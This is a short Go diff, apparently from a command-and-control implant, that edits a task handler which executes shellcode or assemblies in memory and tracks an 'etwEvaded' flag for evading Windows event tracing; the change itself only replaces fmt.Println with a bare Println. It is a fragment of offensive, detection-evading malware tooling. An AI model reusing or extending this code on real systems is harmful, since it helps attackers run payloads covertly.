@@ -7,7 +7,6 @@ import "C"
 
 import (
 	"errors"
-	"fmt"
 )
 
 var etwEvaded bool
@@ -40,7 +39,7 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
     }
 	stdout, _, err = executeAssembly(task.Shellcode, task.Args[0], task.Args[1])
     if err != nil {
-        fmt.Println("Error Occured --> ", err.Error())
+        Println("Error Occured --> ", err.Error())
         return nil, err
     }
 	task.status = "completed"
